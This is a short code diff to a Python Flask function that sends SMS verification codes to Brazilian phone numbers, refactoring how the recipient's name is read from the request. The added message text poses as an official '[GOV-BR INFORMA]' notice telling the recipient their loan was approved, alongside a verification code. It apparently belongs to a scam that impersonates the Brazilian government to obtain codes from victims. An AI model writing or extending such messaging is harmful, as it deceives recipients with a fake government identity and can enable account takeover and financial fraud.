@@ -92,17 +92,14 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
             international_number = f"55{formatted_phone}"
             
             # Get name from request data and format it
-            data = request.get_json()
-            nome = None
+            data = request.get_json() or {}
             
             # Try getting name from different sources
-            if data and 'userData' in data:
-                nome = data['userData'].get('nome', '')
-            if not nome:
-                nome = request.form.get('nome')
-            if not nome:
-                nome = request.args.get('nome')
-                
+            nome = (data.get('userData', {}).get('nome') or 
+                   data.get('nome') or 
+                   request.form.get('nome') or 
+                   request.args.get('nome'))
+            
             app.logger.info(f"Nome encontrado: {nome}")
             
             # Format name if found
@@ -110,11 +107,10 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
                 nome = nome.strip()
                 first_name = nome.split()[0].lower().capitalize()
                 app.logger.info(f"Nome formatado para SMS: {first_name}")
-            else:
-                app.logger.error("Nome não encontrado para SMS")
-                return False, "Nome não encontrado"
                 
-            if not first_name:
+                # Create message with formatted name
+                message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo foi aprovado. Seu código de verificação é: {verification_code}."
+            else:
                 app.logger.error("Nome não encontrado para SMS")
                 return False, "Nome não encontrado"
                 
